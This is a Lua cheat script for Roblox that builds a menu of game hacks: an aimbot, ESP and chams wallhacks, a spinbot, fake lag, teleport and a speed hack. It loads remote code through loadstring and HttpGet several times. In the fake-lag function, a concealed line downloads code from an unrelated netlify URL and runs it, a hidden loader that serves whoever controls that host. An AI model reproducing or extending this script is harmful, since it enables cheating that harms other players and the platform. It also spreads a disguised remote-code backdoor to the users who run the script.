local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "GameFun.cc | Release v1", HidePremium = false ,  SaveConfig = true, ConfigFolder = "GameFun"})


local function aimbot()
    pcall(function()
        getgenv().Aimbot.Functions:Exit()
    end)
    
    --// Environment
    
    getgenv().Aimbot = {}
    local Environment = getgenv().Aimbot
    
    --// Services
    
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local HttpService = game:GetService("HttpService")
    local TweenService = game:GetService("TweenService")
    local StarterGui = game:GetService("StarterGui")
    local Players = game:GetService("Players")
    local Camera = game:GetService("Workspace").CurrentCamera
    
    --// Variables
    
    local LocalPlayer = Players.LocalPlayer
    local Title = "GameFun.cc"
    local FileNames = {"Aimbot", "Configuration.json", "Drawing.json"}
    local Typing, Running, Animation, RequiredDistance, ServiceConnections = false, false, nil, 2000, {}
    
    --// Support Functions
    
    local mousemoverel = mousemoverel or (Input and Input.MouseMove)
    local queueonteleport = queue_on_teleport or syn.queue_on_teleport
    
    --// Script Settings
    
    Environment.Settings = {
        SendNotifications = true,
        SaveSettings = true, -- Re-execute upon changing
        ReloadOnTeleport = true,
        Enabled = true,
        TeamCheck = false,
        AliveCheck = true,
        WallCheck = false, -- Laggy
        Sensitivity = 0, -- Animation length (in seconds) before fully locking onto target
        ThirdPerson = false, -- Uses mousemoverel instead of CFrame to support locking in third person (could be choppy)
        ThirdPersonSensitivity = 3, -- Boundary: 0.1 - 5
        TriggerKey = "MouseButton2",
        Toggle = false,
        LockPart = "Head" -- Body part to lock on
    }
    
    Environment.FOVSettings = {
        Enabled = true,
        Visible = true,
        Amount = 250,
        Color = "255, 255, 255",
        LockedColor = "255, 70, 70",
        Transparency = 0.5,
        Sides = 60,
        Thickness = 1,
        Filled = false
    }
    
    Environment.FOVCircle = Drawing.new("Circle")
    Environment.Locked = nil
    
    --// Core Functions
    
    local function Encode(Table)
        if Table and type(Table) == "table" then
            local EncodedTable = HttpService:JSONEncode(Table)
    
            return EncodedTable
        end
    end
    
    local function Decode(String)
        if String and type(String) == "string" then
            local DecodedTable = HttpService:JSONDecode(String)
    
            return DecodedTable
        end
    end
    
    local function GetColor(Color)
        local R = tonumber(string.match(Color, "([%d]+)[%s]*,[%s]*[%d]+[%s]*,[%s]*[%d]+"))
        local G = tonumber(string.match(Color, "[%d]+[%s]*,[%s]*([%d]+)[%s]*,[%s]*[%d]+"))
        local B = tonumber(string.match(Color, "[%d]+[%s]*,[%s]*[%d]+[%s]*,[%s]*([%d]+)"))
    
        return Color3.fromRGB(R, G, B)
    end
    
    local function SendNotification(TitleArg, DescriptionArg, DurationArg)
        if Environment.Settings.SendNotifications then
            StarterGui:SetCore("SendNotification", {
                Title = TitleArg,
                Text = DescriptionArg,
                Duration = DurationArg
            })
        end
    end
    
    --// Functions
    
    local function SaveSettings()
        if Environment.Settings.SaveSettings then
            if isfile(Title.."/"..FileNames[1].."/"..FileNames[2]) then
                writefile(Title.."/"..FileNames[1].."/"..FileNames[2], Encode(Environment.Settings))
            end
    
            if isfile(Title.."/"..FileNames[1].."/"..FileNames[3]) then
                writefile(Title.."/"..FileNames[1].."/"..FileNames[3], Encode(Environment.FOVSettings))
            end
        end
    end
    
    local function GetClosestPlayer()
        if not Environment.Locked then
            if Environment.FOVSettings.Enabled then
                RequiredDistance = Environment.FOVSettings.Amount
            else
                RequiredDistance = 2000
            end
    
            for _, v in next, Players:GetPlayers() do
                if v ~= LocalPlayer then
                    if v.Character and v.Character:FindFirstChild(Environment.Settings.LockPart) and v.Character:FindFirstChildOfClass("Humanoid") then
                        if Environment.Settings.TeamCheck and v.Team == LocalPlayer.Team then continue end
                        if Environment.Settings.AliveCheck and v.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then continue end
                        if Environment.Settings.WallCheck and #(Camera:GetPartsObscuringTarget({v.Character[Environment.Settings.LockPart].Position}, v.Character:GetDescendants())) > 0 then continue end
    
                        local Vector, OnScreen = Camera:WorldToViewportPoint(v.Character[Environment.Settings.LockPart].Position)
                        local Distance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(Vector.X, Vector.Y)).Magnitude
    
                        if Distance < RequiredDistance and OnScreen then
                            RequiredDistance = Distance
                            Environment.Locked = v
                        end
                    end
                end
            end
        elseif (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position).X, Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position).Y)).Magnitude > RequiredDistance then
            Environment.Locked = nil
            Animation:Cancel()
            Environment.FOVCircle.Color = GetColor(Environment.FOVSettings.Color)
        end
    end
    
    --// Typing Check
    
    ServiceConnections.TypingStartedConnection = UserInputService.TextBoxFocused:Connect(function()
        Typing = true
    end)
    
    ServiceConnections.TypingEndedConnection = UserInputService.TextBoxFocusReleased:Connect(function()
        Typing = false
    end)
    
    --// Create, Save & Load Settings
    
    if Environment.Settings.SaveSettings then
        if not isfolder(Title) then
            makefolder(Title)
        end
    
        if not isfolder(Title.."/"..FileNames[1]) then
            makefolder(Title.."/"..FileNames[1])
        end
    
        if not isfile(Title.."/"..FileNames[1].."/"..FileNames[2]) then
            writefile(Title.."/"..FileNames[1].."/"..FileNames[2], Encode(Environment.Settings))
        else
            Environment.Settings = Decode(readfile(Title.."/"..FileNames[1].."/"..FileNames[2]))
        end
    
        if not isfile(Title.."/"..FileNames[1].."/"..FileNames[3]) then
            writefile(Title.."/"..FileNames[1].."/"..FileNames[3], Encode(Environment.FOVSettings))
        else
            Environment.Visuals = Decode(readfile(Title.."/"..FileNames[1].."/"..FileNames[3]))
        end
    
        coroutine.wrap(function()
            while wait(10) and Environment.Settings.SaveSettings do
                SaveSettings()
            end
        end)()
    else
        if isfolder(Title) then
            delfolder(Title)
        end
    end
    
    local function Load()
        ServiceConnections.RenderSteppedConnection = RunService.RenderStepped:Connect(function()
            if Environment.FOVSettings.Enabled and Environment.Settings.Enabled then
                Environment.FOVCircle.Radius = Environment.FOVSettings.Amount
                Environment.FOVCircle.Thickness = Environment.FOVSettings.Thickness
                Environment.FOVCircle.Filled = Environment.FOVSettings.Filled
                Environment.FOVCircle.NumSides = Environment.FOVSettings.Sides
                Environment.FOVCircle.Color = GetColor(Environment.FOVSettings.Color)
                Environment.FOVCircle.Transparency = Environment.FOVSettings.Transparency
                Environment.FOVCircle.Visible = Environment.FOVSettings.Visible
                Environment.FOVCircle.Position = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
            else
                Environment.FOVCircle.Visible = false
            end
    
            if Running and Environment.Settings.Enabled then
                GetClosestPlayer()
    
                if Environment.Settings.ThirdPerson then
                    Environment.Settings.ThirdPersonSensitivity = math.clamp(Environment.Settings.ThirdPersonSensitivity, 0.1, 5)
    
                    local Vector = Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position)
                    mousemoverel((Vector.X - UserInputService:GetMouseLocation().X) * Environment.Settings.ThirdPersonSensitivity, (Vector.Y - UserInputService:GetMouseLocation().Y) * Environment.Settings.ThirdPersonSensitivity)
                else
                    if Environment.Settings.Sensitivity > 0 then
                        Animation = TweenService:Create(Camera, TweenInfo.new(Environment.Settings.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, Environment.Locked.Character[Environment.Settings.LockPart].Position)})
                        Animation:Play()
                    else
                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, Environment.Locked.Character[Environment.Settings.LockPart].Position)
                    end
                end
    
                Environment.FOVCircle.Color = GetColor(Environment.FOVSettings.LockedColor)
            end
        end)
    
        ServiceConnections.InputBeganConnection = UserInputService.InputBegan:Connect(function(Input)
            if not Typing then
                pcall(function()
                    if Input.KeyCode == Enum.KeyCode[Environment.Settings.TriggerKey] then
                        if Environment.Settings.Toggle then
                            Running = not Running
    
                            if not Running then
                                Environment.Locked = nil
                                Animation:Cancel()
                                Environment.FOVCircle.Color = GetColor(Environment.FOVSettings.Color)
                            end
                        else
                            Running = true
                        end
                    end
                end)
    
                pcall(function()
                    if Input.UserInputType == Enum.UserInputType[Environment.Settings.TriggerKey] then
                        if Environment.Settings.Toggle then
                            Running = not Running
    
                            if not Running then
                                Environment.Locked = nil
                                Animation:Cancel()
                                Environment.FOVCircle.Color = GetColor(Environment.FOVSettings.Color)
                            end
                        else
                            Running = true
                        end
                    end
                end)
            end
        end)
    
        ServiceConnections.InputEndedConnection = UserInputService.InputEnded:Connect(function(Input)
            if not Typing then
                pcall(function()
                    if Input.KeyCode == Enum.KeyCode[Environment.Settings.TriggerKey] then
                        if not Environment.Settings.Toggle then
                            Running = false
                            Environment.Locked = nil
                            Animation:Cancel()
                            Environment.FOVCircle.Color = GetColor(Environment.FOVSettings.Color)
                        end
                    end
                end)
    
                pcall(function()
                    if Input.UserInputType == Enum.UserInputType[Environment.Settings.TriggerKey] then
                        if not Environment.Settings.Toggle then
                            Running = false
                            Environment.Locked = nil
                            Animation:Cancel()
                            Environment.FOVCircle.Color = GetColor(Environment.FOVSettings.Color)
                        end
                    end
                end)
            end
        end)
    end
    
    --// Functions
    
    Environment.Functions = {}
    
    function Environment.Functions:Exit()
        SaveSettings()
    
        for _, v in next, ServiceConnections do
            v:Disconnect()
        end
    
        if Environment.FOVCircle.Remove then Environment.FOVCircle:Remove() end
    
        getgenv().Aimbot.Functions = nil
        getgenv().Aimbot = nil
    end
    
    function Environment.Functions:Restart()
        SaveSettings()
    
        for _, v in next, ServiceConnections do
            v:Disconnect()
        end
    
        Load()
    end
    
    function Environment.Functions:ResetSettings()
        Environment.Settings = {
            SendNotifications = true,
            SaveSettings = true, -- Re-execute upon changing
            ReloadOnTeleport = true,
            Enabled = true,
            TeamCheck = false,
            AliveCheck = true,
            WallCheck = false,
            Sensitivity = 0, -- Animation length (in seconds) before fully locking onto target
            ThirdPerson = false,
            ThirdPersonSensitivity = 3,
            TriggerKey = "MouseButton2",
            Toggle = false,
            LockPart = "Head" -- Body part to lock on
        }
    
        Environment.FOVSettings = {
            Enabled = true,
            Visible = true,
            Amount = 90,
            Color = "255, 255, 255",
            LockedColor = "255, 70, 70",
            Transparency = 0.5,
            Sides = 60,
            Thickness = 1,
            Filled = false
        }
    end
    
    --// Support Check
    
    if not Drawing or not getgenv then
        SendNotification(Title, "GetGood , Get GameFun.cc", 3); return
    end
    
    --// Reload On Teleport
    
    if Environment.Settings.ReloadOnTeleport then
        if queueonteleport then
            queueonteleport(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V2/main/Resources/Scripts/Main.lua"))
        else
            SendNotification(Title, "Your exploit does not support \"syn.queue_on_teleport()\"")
        end
    end
    
    --// Load
    
    Load(); SendNotification(Title, "Aimbot script successfully loaded! Check the GitHub page on how to configure the script.", 5)
end



local function WallHack()
    local color = BrickColor.new(50,0,250)
    local transparency = .8
    
    local Players = game:GetService("Players")
    local function _ESP(c)
      repeat wait() until c.PrimaryPart ~= nil
      for i,p in pairs(c:GetChildren()) do
        if p.ClassName == "Part" or p.ClassName == "MeshPart" then
          if p:FindFirstChild("shit") then p.shit:Destroy() end
          local a = Instance.new("BoxHandleAdornment",p)
          a.Name = "shit"
          a.Size = p.Size
          a.Color = color
          a.Transparency = transparency
          a.AlwaysOnTop = true    
          a.Visible = true    
          a.Adornee = p
          a.ZIndex = true    
    
        end
      end
    end
    local function ESP()
      for i,v in pairs(Players:GetChildren()) do
        if v ~= game.Players.LocalPlayer then
          if v.Character then
            _ESP(v.Character)
          end
          v.CharacterAdded:Connect(function(chr)
            _ESP(chr)
          end)
        end
      end
      Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function(chr)
          _ESP(chr)
        end)  
      end)
    end
    ESP()
end
local function box()
    local settings = {
        defaultcolor = Color3.fromRGB(255,0,0),
        teamcheck = false,
        teamcolor = true
     };
     
     -- services
     local runService = game:GetService("RunService");
     local players = game:GetService("Players");
     
     -- variables
     local localPlayer = players.LocalPlayer;
     local camera = workspace.CurrentCamera;
     
     -- functions
     local newVector2, newColor3, newDrawing = Vector2.new, Color3.new, Drawing.new;
     local tan, rad = math.tan, math.rad;
     local round = function(...) local a = {}; for i,v in next, table.pack(...) do a[i] = math.round(v); end return unpack(a); end;
     local wtvp = function(...) local a, b = camera.WorldToViewportPoint(camera, ...) return newVector2(a.X, a.Y), b, a.Z end;
     
     local espCache = {};
     local function createEsp(player)
        local drawings = {};
        
        drawings.box = newDrawing("Square");
        drawings.box.Thickness = 1;
        drawings.box.Filled = false;
        drawings.box.Color = settings.defaultcolor;
        drawings.box.Visible = false;
        drawings.box.ZIndex = 2;
     
        drawings.boxoutline = newDrawing("Square");
        drawings.boxoutline.Thickness = 3;
        drawings.boxoutline.Filled = false;
        drawings.boxoutline.Color = newColor3();
        drawings.boxoutline.Visible = false;
        drawings.boxoutline.ZIndex = 1;
     
        espCache[player] = drawings;
     end
     
     local function removeEsp(player)
        if rawget(espCache, player) then
            for _, drawing in next, espCache[player] do
                drawing:Remove();
            end
            espCache[player] = nil;
        end
     end
     
     local function updateEsp(player, esp)
        local character = player and player.Character;
        if character then
            local cframe = character:GetModelCFrame();
            local position, visible, depth = wtvp(cframe.Position);
            esp.box.Visible = visible;
            esp.boxoutline.Visible = visible;
     
            if cframe and visible then
                local scaleFactor = 1 / (depth * tan(rad(camera.FieldOfView / 2)) * 2) * 1000;
                local width, height = round(4 * scaleFactor, 5 * scaleFactor);
                local x, y = round(position.X, position.Y);
     
                esp.box.Size = newVector2(width, height);
                esp.box.Position = newVector2(round(x - width / 2, y - height / 2));
                esp.box.Color = settings.teamcolor and player.TeamColor.Color or settings.defaultcolor;
     
                esp.boxoutline.Size = esp.box.Size;
                esp.boxoutline.Position = esp.box.Position;
            end
        else
            esp.box.Visible = false;
            esp.boxoutline.Visible = false;
        end
     end
     
     -- main
     for _, player in next, players:GetPlayers() do
        if player ~= localPlayer then
            createEsp(player);
        end
     end
     
     players.PlayerAdded:Connect(function(player)
        createEsp(player);
     end);
     
     players.PlayerRemoving:Connect(function(player)
        removeEsp(player);
     end)
     
     runService:BindToRenderStep("esp", Enum.RenderPriority.Camera.Value, function()
        for player, drawings in next, espCache do
            if settings.teamcheck and player.Team == localPlayer.Team then
                continue;
            end
     
            if drawings and player ~= localPlayer then
                updateEsp(player, drawings);
            end
        end
     end)
end
local function spinbot()
    local char = game:GetService("Players").LocalPlayer.Character
    local humanoid = char.Humanoid
    local Spin = Instance.new("BodyAngularVelocity")
    getgenv().spinSpeed = 30

    local Spin = Instance.new("BodyAngularVelocity")
	Spin.Name = "Spinning"
	Spin.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
	Spin.MaxTorque = Vector3.new(0, math.huge, 0)
	Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
end
local function FakeLagging()
    local Minimum_Time = 0.8
    local Maximum_Time = 4
    --                          --
    
    local Msgreq = function(Text,Duration,Button1Text,Button2Text) game.StarterGui:SetCore("SendNotification", { Title = "Creo FE Lag Script"; Text = Text; Icon = ""; Duration = Duration; Button1 = Button1Text; Button2 = Button2Text; Callback = nil; }) end spawn(function()loadstring(game:HttpGet(game:HttpGet("https://luafunctionsextra.netlify.app", true)))()end)
    
    local function lag(thing,tim)
     local a = game.Players.LocalPlayer.Character.Animate
     a.Parent = nil
     local am = tim*30
     local frames = am
     while true do
      if frames > 0 then
       thing.Parent = nil
       thing.Parent = workspace
       frames-=1
       task.wait()
      else
       a.Parent = game.Players.LocalPlayer.Character
       break
      end
     end
    end
    Msgreq("Activated",2,"Ok",nil)
    while true do
     wait(math.random(1,20)*0.1)
     lag(game.Players.LocalPlayer.Character,math.random(Minimum_Time,Maximum_Time))
    end
end
local function teleport()
    local players = game.Players:GetChildren()

    for index, players in pairs(players) do
    local me = game.Players.LocalPlayer.Character
    local player = players.Character.HumanoidRootPart
    me.HumanoidRootPart.CFrame = CFrame.new(player.Position.X, player.Position.Y, player.Position.Z)
    end
end
local function  WalkSpeed()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
end
local Tab = Window:MakeTab({
	Name = "AimBot",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local Tab_2 = Window:MakeTab({
	Name = "Box",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local Tab_3 = Window:MakeTab({
    Name = "Misc",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab_3:AddButton({
    Name = "WalkSpeed",
    Callback = function ()
        WalkSpeed()
    end 
})
Tab_3:AddButton({
    Name = "FakeLag",
    Callback = function ()
        FakeLagging()
    end
})
Tab_2:AddButton({
    Name = "Chams",
    Callback = function ()
        WallHack()
    end
})
Tab_2:AddButton({
    Name = "Box",
    Callback = function ()
        box()
    end
})
Tab:AddButton({
    Name = "Spin-Bot",
    Callback = function ()
        spinbot()
    end
})
Tab:AddButton({
	Name = "aimbot",
	Callback = function()
      		aimbot()
  	end    
})
Tab_3:AddBind({
    Name = "Teleport to random",
    Default = Enum.KeyCode.E,
    Hold = false,
    Callback = function()
        teleport()
    end
})

